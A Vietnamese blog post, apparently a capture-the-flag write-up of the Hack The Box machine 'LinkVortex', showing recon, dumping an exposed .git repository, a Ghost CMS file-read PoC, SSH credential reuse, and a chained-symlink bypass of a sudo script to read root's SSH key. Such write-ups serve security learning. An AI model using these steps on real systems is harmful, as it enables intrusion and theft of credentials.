---
layout: post
title: Fucking shit cái hacking challenge củ b` này đã làm đầu óc tôi bận rộn 2 ngày cuối tuần vừa rồi.
subtitle: DCM :)), nếu bạn đã từng thử, chắc hẳn bạn sẽ bị nghiện khi thử mấy cái CTF challenge kiểu này. Btw, tôi mong bạn nên dành thời gian để tận hưởng cuộc sống, nấu ăn hay chơi thể thao hay thậm chí tận hưởng thời gian cuối tuần tuyệt vời với cô nàng của bạn chứ k phải dành thời gian cho cái thứ chết tiệt này. Rất may tôi vẫn còn có một giấc ngủ ngon và không mơ về nó. 
tags: [ctf, cybersecurity, exploit]
author: VuNguyen
---

# LinkVortex

Link room: https://app.hackthebox.com/machines/LinkVortex

# Tiếp cận

Dĩ nhiên, nếu một CTF game thông thường thì việc scan port thì bạn cũng sẽ không cần suy nghĩ quá nhiều

## Open port scan:

Scan trước các port các port có thể đang mở trên máy. Hãy thoải mái khi dùng `-T5` bởi vì đây là 1 CTF game

```bash
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex]# docker run --rm -it parrotsec/tools-nmap -v -Pn -T5 10.10.11.47
Starting Nmap 7.92 ( https://nmap.org ) at 2025-01-20 03:21 UTC
Nmap scan report for 10.10.11.47
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Có 2 port đang mở trên máy mục tiêu. Hãy khám phá thêm thông tin về OS, service hay version của ports đang mở đó

```bash
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex]# docker run --rm -it parrotsec/tools-nmap -v -sV -O -p22,80 -T5 10.10.11.47
Starting Nmap 7.92 ( https://nmap.org ) at 2025-01-20 03:26 UTC
Nmap scan report for 10.10.11.47
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (99%), Linux 4.15 - 5.6 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (94%), Linux 5.4 (94%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Các thông tin này có thể hữu ích trong mục đích điều tra trong tương lai. Điều đáng chú ý là có một port đang được open, đây là một website. Thử truy xuât vào và khám phá xem có điều gì đang diễn ra

```bash
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex]# curl  http://10.10.11.47
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://linkvortex.htb/">here</a>.</p>
</body></html>
```

Oh, có vẻ như website đang redirect đến một domain khác, đây là một local domain được chỉ định sẵn, đối với những kết quả như thế này. Trên 50% khả năng sẽ có một subdomain khác được bao gồm. 

Chưa cần vội kiểm tra xem website có gì, hãy thu thập thêm thông tin để có góc nhìn rộng hơn và verify chính xác trên 50% khả năng tồn tại subdomain đã nói bên trên.

***Trước hết cần chỉ định trỏ đến domain để có thể access vào website mục tiêu***:

```bash
127.0.0.1       localhost
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.47 linkvortex.htb
```

## Subdomain scan

Chọn ra một wordlists để từ đó có thể tạo một fuzzing payload. Nên thử trước với những wordlists ngắn để tối ưu thời gian:

```bash
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex]# fdfind -g "*domain*" /usr/share/seclists/
/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
/usr/share/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt
/usr/share/seclists/Discovery/DNS/combined_subdomains.txt
/usr/share/seclists/Discovery/DNS/italian-subdomains.txt
/usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt
/usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
/usr/share/seclists/Discovery/DNS/subdomains-spanish.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Fuzzing/User-Agents/software-name/domain-re-animator-bot.txt
/usr/share/seclists/Fuzzing/User-Agents/software-name/domaintools-surveybot.txt
/usr/share/seclists/Fuzzing/email-top-100-domains.txt
/usr/share/seclists/IOCs/kaspersky-careto-domains.txt
/usr/share/seclists/Miscellaneous/domains-1million-top.txt
/usr/share/seclists/Miscellaneous/top-domains-alexa.csv.zip
/usr/share/seclists/Miscellaneous/top-domains-majestic.csv.zip
```

Ở đây mình sẽ chọn `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` wordlist để thử trước tiên.

**Sử dụng ffuf để thực hiện subdomain enum**

```bash
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex]# docker run -it --rm -v /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:/tmp/wordlist.txt -v /etc/hosts:/etc/hosts secsi/ffuf -u http://linkvortex.htb -H "Host: FUZZ.linkvortex.htb" -w /tmp/wordlist.txt -c -r -fs 12148

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb
 :: Wordlist         : FUZZ: /tmp/wordlist.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 12148
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 154ms]
:: Progress: [641/4989] :: Job [1/1] :: 33 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

May mắn tìm được một subdomain đang được public. Một lần nữa trỏ domain và sau đó hãy thử khám phá những điều thú vị của subdomain này.

Lúc này chúng ta đã có một vài thông tin hữu ích nhưng cũng chưa thể nghĩ ra được thêm nhiều phương án để tiếp cận các bước tiếp theo.

Thông thường, sẽ cố gắng liệt kê những endpoint đang tồn tại của mục tiêu để có thêm những phương án tiếp cận hay lỗ hổng đang tồn tại trên mục tiêu. Vì vậy, hãy tiếp cận chúng theo các cách thông thường trước.

Chọn wordlist để liệt kê những endpoint đang tồn tại

```bash
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex]# fdfind -g "*dir*" /usr/share/seclists/
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/directus-all-levels.txt
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/directus.txt
/usr/share/seclists/Discovery/Web-Content/KitchensinkDirectories.fuzz.txt
/usr/share/seclists/Discovery/Web-Content/SVNDigger/all-dirs.txt
/usr/share/seclists/Discovery/Web-Content/combined_directories.txt
/usr/share/seclists/Discovery/Web-Content/common_directories.txt
....
```

Sẽ thử trước với `/usr/share/seclists/Discovery/Web-Content/dirsearch.txt` 

**Dirsearch [linkvortex.htb](http://linkvortex.htb/)** 

```bash
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex]# docker run -it --rm -v /usr/share/seclists/Discovery/Web-Content/dirsearch.txt:/tmp/wordlist.txt -v /etc/hosts:/etc/hosts secsi/ffuf -u http://linkvortex.htb/FUZZ -w /tmp/wordlist.txt -c -r

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /tmp/wordlist.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.                       [Status: 200, Size: 12148, Words: 2590, Lines: 308, Duration: 555ms]
                        [Status: 200, Size: 12148, Words: 2590, Lines: 308, Duration: 467ms]
About/                  [Status: 200, Size: 8284, Words: 1296, Lines: 162, Duration: 616ms]
About                   [Status: 200, Size: 8284, Words: 1296, Lines: 162, Duration: 465ms]
Private/                [Status: 200, Size: 12148, Words: 2590, Lines: 308, Duration: 680ms]
RSS/                    [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 259ms]
RSS                     [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 215ms]
Rss                     [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 478ms]
about/                  [Status: 200, Size: 8284, Words: 1296, Lines: 162, Duration: 576ms]
about                   [Status: 200, Size: 8284, Words: 1296, Lines: 162, Duration: 553ms]
favicon.ico             [Status: 200, Size: 15406, Words: 43, Lines: 2, Duration: 437ms]
feed/                   [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 455ms]
feed                    [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 389ms]
private/                [Status: 200, Size: 12148, Words: 2590, Lines: 308, Duration: 664ms]
robots.txt              [Status: 200, Size: 121, Words: 7, Lines: 7, Duration: 349ms]
rss/                    [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 537ms]
sitemap.xml             [Status: 200, Size: 527, Words: 6, Lines: 1, Duration: 294ms]
:: Progress: [12939/12939] :: Job [1/1] :: 50 req/sec :: Duration: [0:03:37] :: Errors: 4147 ::
```

Dirsearch [dev.**linkvortex.htb**](http://dev.linkvortex.htb/FUZZ) 

```bash
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex]# docker run -it --rm -v /usr/share/seclists/Discovery/Web-Content/dirsearch.txt:/tmp/wordlist.txt -v /etc/hosts:/etc/hosts secsi/ffuf -u http://dev.linkvortex.htb/FUZZ -w /tmp/wordlist.txt -c -r

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.linkvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /tmp/wordlist.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.                       [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 156ms]
.git/                   [Status: 200, Size: 2796, Words: 186, Lines: 26, Duration: 161ms]
.git/config             [Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 160ms]
.git/description        [Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 160ms]
.git/hooks/             [Status: 200, Size: 3540, Words: 208, Lines: 28, Duration: 163ms]
....
index.html              [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 225ms]
:: Progress: [12939/12939] :: Job [1/1] :: 255 req/sec :: Duration: [0:00:38] :: Errors: 4147 ::
```

Có hàng tá thông tin có ích nhưng với subdomain dev có vẻ có nhiều thứ hay ho hơn :))). Nhưng hãy thử kiểm tra qua một lượt tất cả thông tin vừa thu thập được để tránh miss những manh mỗi hữu ích.

Tất cả những endpoints được kiểm tra qua một lượt ở [http://linkvortex.htb/](http://linkvortex.htb/) đều không đem lại nhiều thông tin hữu ích, ngoại trừ `robots.txt`

```bash
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex]# curl http://linkvortex.htb/robots.txt
User-agent: *
Sitemap: http://linkvortex.htb/sitemap.xml
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/
```

Tất cả những domain được **Disallow** đều trả 404 ngoại trừ ****`/ghost/` đã navigate về một trang login. Điều này mở ra một chân trời mới với những ý tưởng mới 🤤

![image.png](/assets/img/linkvortex/image.png)

Các ý tưởng và khả năng có thể thực hiện:

- Brute force login account
- Exploit CVE dựa vào framework version

### Brute force login account

Đối với ý tưởng này, đó nên là kế hoạch B bởi vì khả năng để brute force được một admin account sẽ thấp và tốn thời gian, chưa kể bạn vẫn chưa thể biết được bất cứ username nào. Việc này nếu muốn thực hiện thì nên được làm như một background script *(có thể tạo một docker container để isolate process này với các task khác)* thực hiện brute force tìm username và sau đó brute force tiếp password dựa trên username đó và có thể lãng quên nó trong một thời gian mặc kệ nó chạy. Nếu may mắn đến với bạn thì bạn chỉ cần ngủ một giấc ngon lành từ đêm đến sáng và kết quả sẽ nhả ra admin account cho bạn 🤣. 

Theo trực giác, tôi vô tình gõ một account theo tên tổ chức (admin@linkvortex.htb) thì nhận được phản hồi: `Your password is incorrect.`  không giống như khi nhập một email address bất kì:

![image.png](/assets/img/linkvortex/image%201.png)

![image.png](/assets/img/linkvortex/image%202.png)

Chứng tỏ rằng email **`admin@linkvortex.htb`**  có tồn tại trên hệ thống và chúng ta đã bớt đi một bước để tìm kiếm username. Đây là một sự may mắn.

Việc nghĩ đến tiếp theo sẽ là quét password dựa trên username này. Tuy nhiên, như đã nói ở trên, nó nên là một background script, ***tôi đã thử thực hiện điều này nhưng không may mắn khi mục tiêu đã được set rate-limit. Vì vậy, cần phải nghĩ đến một phương án tiếp theo.***

### Exploit CVE dựa vào framework version

Cách này cần tìm được version của Ghost CMS, lần này tôi đã thử thực hiện explore qua Burp để tìm được thông tin version dựa trên các requests và responses.

Tôi đã tìm được ngay sau đó khi khám phá qua login request, không mất nhiều thời gian 

![image.png](/assets/img/linkvortex/image%203.png)

Sau khi tìm được version, tôi đã cố gắng tìm kiếm thông tin về bất kì CVE nào đó để có thể RCE vào được. Hiện tại tôi có tìm được một PoC tuy không thể RCE nhưng ít nhất có thể cung cấp được một vài thông tin hữu ích và vector để tôi có thể nghĩ đến việc thực hiện leo thang đặc quyền (LPE).

[https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028)

Nhưng CVE này cần username và password để có thể thực hiện. Vì vậy, tôi nghĩ mình phải bắt buộc tìm ra được password trước khi làm các bước tiếp theo.

*Vì mục tiêu đã rate-limit requests, tôi cần phải quên ngay việc tiếp tục brute force account.*

Nhớ lại trước đó đã tìm được một vài thông tin hữu ích khi thực hiện dò quét endpoints của domain [http://dev.linkvortex.htb](http://linkvortex.htb/) bên trên. Điểu thu hút sự chú ý của tôi là thư mục `.git/` **bằng một cách nào đó được vô tình push lên và public ra ngoài internet.** Tôi nghĩ tôi sẽ dành hết sự tập trung để khai thác điều này.

### Git Exposed Exploit

Điều đầu tiên tôi đã nghĩ đến khi bắt đầu khai thác lỗi này là sẽ download folder này về để có thể tận dụng `git-pull` được source code.

Sử dụng script: https://github.com/arthaud/git-dumper để dump repo của website

```bash
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex]# git-dumper http://dev.linkvortex.htb/.git/ so
urces/
[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
...
Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 5596 paths from the index
```

Sau khi dump về tôi nhận được source code của website, **đến bước này tôi nghĩ mọi chuyện đang dần sáng tỏ.**

```bash
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex]# cd sources/
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex/sources]# ls
Dockerfile.ghost  PRIVACY.md  SECURITY.md  ghost    package.json
LICENSE           README.md   apps         nx.json  yarn.lock
...
```

Kiểm tra một vài thay đổi của repo bằng vài command như git log hay git status thì tôi nhận được vài điều hay ho:

```bash
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex/sources]# git status 
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   Dockerfile.ghost
        modified:   ghost/core/test/regression/api/admin/authentication.test.js
```

Có 2 file đã được thay đổi ở đây, hãy xem chúng đã thay đổi những gì:

![image.png](/assets/img/linkvortex/image%204.png)

![image.png](/assets/img/linkvortex/image%205.png)

Có một password nào đó đã được thay đổi, quay lại và thử nó với account đã tìm được lúc nãy (`admin@linkvortex.htb`) và xem tôi có may mắn hay không.

Thật tuyệt vời! Tôi đã có thể vào được trang quản trị của Ghost CMS 😱

![image.png](/assets/img/linkvortex/image%206.png)

Giờ sẽ làm gì tiếp theo ? Nghĩ lại PoC vừa nãy có yêu cầu password. Tôi đã thử sử dụng PoC để thử đọc được nội dung của những file trên server. Có một vài file tôi có thể đọc được và một vài file thì không. Nhưng thú thực lúc này tôi cũng chưa biết được file nào là hữu ích để tôi có thể đọc 😄. Quyền hạn lúc này là rất hạn chế, tôi đang cố tìm mọi cách để có thể nâng lên RCE. Nhưng điều này có vẻ rất khó khăn đối với một quyền chỉ đọc. Và tôi cảm thấy mệt mỏi khi tìm giải pháp trong những thời gian sau đó 😵‍💫.

*Sau đó tôi tính bỏ qua vector này, vì tôi nghĩ đó có thể là một **rabbit hole :))** . Chắc phải có một cách nào đó khác để có thể RCE. Nên tôi tính bỏ qua cái PoC này luôn*

Lúc đầu óc đang rối bời đột nhiên nghĩ lại rằng dường như mình đã bỏ quên gì đó. Nhận ra lúc kiểm tra `git status` có 2 file thay đổi chứ không chỉ 1, tôi đã bỏ quên mất thay đổi còn lại. Lúc này, tôi phải quay lại để kiểm tra xem liệu tôi đã bỏ lỡ thứ gì…

```bash
[root@vunv-redteam-sb.dev.virt:~/redteam/ctf/linkvortex/sources]# git diff --cached Dockerfile.ghost
diff --git a/Dockerfile.ghost b/Dockerfile.ghost
new file mode 100644
index 0000000..50864e0
--- /dev/null
+++ b/Dockerfile.ghost
@@ -0,0 +1,16 @@
+FROM ghost:5.58.0
+
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+
+# Prevent installing packages
+RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
+
+# Wait for the db to be ready first
+COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
+COPY entry.sh /entry.sh
+RUN chmod +x /var/lib/ghost/wait-for-it.sh
+RUN chmod +x /entry.sh
+
+ENTRYPOINT ["/entry.sh"]
+CMD ["node", "current/index.js"]
```

Đầu óc bừng tình khi nhìn thấy dòng chữ `production`  nhạy cảm, có vẻ có gì bên trong đó. Với kinh nghiệm làm việc với Docker của tôi, tôi không mất quá 1s để hiểu được tập lệnh này làm gì 😌

Nhưng làm sao để đọc được nội dung của file  `config.production.json` bên trong `/var/lib/ghost/` . Là rõ, PoC vừa nãy sẽ giúp bạn điều này 😜.

Sau đó tôi đã thử đọc file cấu hình với hy vọng tìm được một gì đó chí mạng để chấm dứt tất cả những chuỗi ngày tăm tối vừa qua, nhưng có vẻ thông tin đem lại không mấy hữu ích.

```bash
Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
File content:
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```

Cấu hình có đề cập đến có một dịch vụ SMTP được mở trên cổng `587` bao gồm user và pass, nhưng ở bước đầu khi tôi quét bằng Nmap thì không thấy thông tin port này được hiển thị vì vậy có thể đây là một **local port**.

Nghĩ về cách làm thế nào để từ admin dashboard kia mà có thể access sang SMTP port được không ? :)) Không, chắc chắn không, it nhất là trong trường hợp này. Nếu có thể, điều đó quá là điên rồ và epic, tôi không muốn kiệt sức và mệt mỏi một lần nữa 😩.

Lúc này thì tay nhanh hơn não, đem account `bob@linkvortex.htb`  login hết tất cả những chỗ có thể login. Bằng một cách nào đó, account này SSH login thành công 🙂.

Tôi nghĩ đây là một trò đùa khốn nạn của tác giả, tại sao account SMTP lại có thể sử dụng để login vào SSH service 😟. Đây có thể là một lời nhắc về việc sử dụng mất khẩu an toàn hoặc nếu vui hơn thì là như tôi vừa nói :))) (một trò đùa).

Nhưng tôi không thấy vui 😃

Khốn nạn thay, bằng một cách khốn kiếp tôi đã SSH được vào server 🙂

![image.png](/assets/img/linkvortex/image%207.png)

Việc của tôi bây giờ là tìm cách để leo lên `root` để chiếm toàn bộ quyền kiểm soát của máy này. Tôi đã thử quét một vài thông tin trên server để cung cấp cho tôi nhưng vector để tôi có thể leo thang đặc quyền, không gì đáng chú ý ngoài thông tin command được chạy sau:

![image.png](/assets/img/linkvortex/image%208.png)

## Linux Privilliage Escalation

Việc chắc chắn cần làm là sẽ cần xem script kia chạy cái gì, thực hiện đọc nội dung của tập lệnh và nhận được kết quả:

```bash
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi

```

Dễ hiểu, đại loại tập lệnh này sẽ check file path input có bao gồm một **symlink** và symlink đó trỏ đến những thư mục nhạy cảm `(etc|root)`  thì điều này sẽ không được phép và loại bỏ symlink đó, còn nếu không sẽ thực hiện cách ly tới `/var/quarantined` và đọc nội dung của file gốc được trỏ tới (dest file).

*Tôi không muốn nói tập lệnh này thật ngớ ngẩn cho tới khi nhận ra nó có thể quét để kiểm tra xem có bất kì symlink vi phạm nào tồn tại trên hệ thống tệp linux. Tuy nhiên, nếu để tập lệnh này có thể được chạy được với quyền `sudo` thì sẽ cần duplicate nó đến tất cả các folder trên máy và tạo một script chạy quét từng folder trên máy với command: `/usr/bin/bash /opt/ghost/clean_symlink.sh *.png` . Ngoài ra, nó chỉ có khả năng check được những file có đuôi `.png` . Vì vậy, tôi thấy đây là một điều ngớ ngẩn :))) 🤷*

Thôi quên điều ngớ ngẩn này lại, việc của chúng ta bây giờ là chiếm root, ok. Hãy thử tận dụng script này xem có bất kì vector nào để có thể cho chúng ta làm điều đó hay không ?

Có vẻ thì tôi có thể dùng script này đẻ tận dụng để đọc file trong folder `root` . Tuy nhiên, nó sẽ k thể thực hiện được do đoạn lệnh:

```bash
if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
```

Ngay cả đối với những file trong `/etc`  cũng vậy.

Vì vậy, tôi sẽ thử nghĩ ra 1 trick để có thể bypass được đoạn script này để process sẽ được chạy vào `else` của script:

```bash
else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
```

Nếu tôi bypass được, tôi có thể đọc được nội dung của bất cứ file nào trên máy.

Sau một khoảng suy nghĩ, đọc kỹ lại thì script sẽ chỉ kiểm tra nếu destination của symlink được trỏ tới chứa substring `root | etc` thì sẽ loại bỏ symlink đó. Tuy nhiên, script này k check đệ quy vấn đề này mà chỉ check 1 lần, dẫn đến việc một phương án bắc cầu hoàn toàn có thể xảy ra. Ví dụ:

```bash
[root@vunv-redteam-sb.dev.virt:/tmp]# echo "What can i see anything" > /root/secret.txt
[root@vunv-redteam-sb.dev.virt:/tmp]# cat /root/secret.txt 
What can i see anything
[root@vunv-redteam-sb.dev.virt:/tmp]# ln -s /root/secret.txt a.png
[root@vunv-redteam-sb.dev.virt:/tmp]# ls -l | grep ^l
lrwxrwxrwx 1 root root      16 Jan 20 15:31 a.png -> /root/secret.txt
[root@vunv-redteam-sb.dev.virt:/tmp]# ln -s a.png b.png
[root@vunv-redteam-sb.dev.virt:/tmp]# ls -l | grep ^l
lrwxrwxrwx 1 root root      16 Jan 20 15:31 a.png -> /root/secret.txt
lrwxrwxrwx 1 root root       5 Jan 20 15:32 b.png -> a.png
[root@vunv-redteam-sb.dev.virt:/tmp]# readlink b.png 
a.png # This doesn't point symlink to /root, but its actual do
[root@vunv-redteam-sb.dev.virt:/tmp]# cat b.png 
What can i see anything # BOOOMMMM!!
```

Check symlink thì sẽ không có bao gồm substring `root` hay `etc`, nhưng thực chất nó đang trỏ đến đúng thư mục có chứa `root` . Quả là một kế hoạch hoàn hảo 🤑

*Suýt quên, ở tập lệnh yêu cầu cung cấp variable `CHECK_CONTENT=true` để có thể hiển thị content của file. Vì vậy, cần phải khai báo biến này trước khi muốn đọc bất cứ gì đó không được phép. 😬*

```bash
bob@linkvortex:/tmp$ export CHECK_CONTENT=true
bob@linkvortex:/tmp$ env
...
CHECK_CONTENT=true
...
bob@linkvortex:/tmp$ 
```

Tận dụng để đọc thử ssh key 🙂

```bash
bob@linkvortex:/tmp$ ln -s /root/.ssh/id_rsa /home/bob/meow.png
bob@linkvortex:/tmp$ ln -s /home/bob/meow.png go.png
bob@linkvortex:/tmp$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ go.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
...
ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-----END OPENSSH PRIVATE KEY-----
bob@linkvortex:/tmp$ 
```

Hoàn hảo :)). Coi như đã thành công 99%. Giờ thực hiện ssh vào và kiểm tra:

```bash
┌──(kali㉿kali)-[/tmp]
└─$ vim id_rsa
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp]
└─$ chmod 400 id_rsa 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp]
└─$ ssh -i id_rsa bob@linkvortex.htb
bob@linkvortex.htb's password: 

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp]
└─$ ssh -i id_rsa root@linkvortex.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
root@linkvortex:~# id
uid=0(root) gid=0(root) groups=0(root)
root@linkvortex:~# 

```

Cheers!!!!!

# Kết

*“I am really resilient”*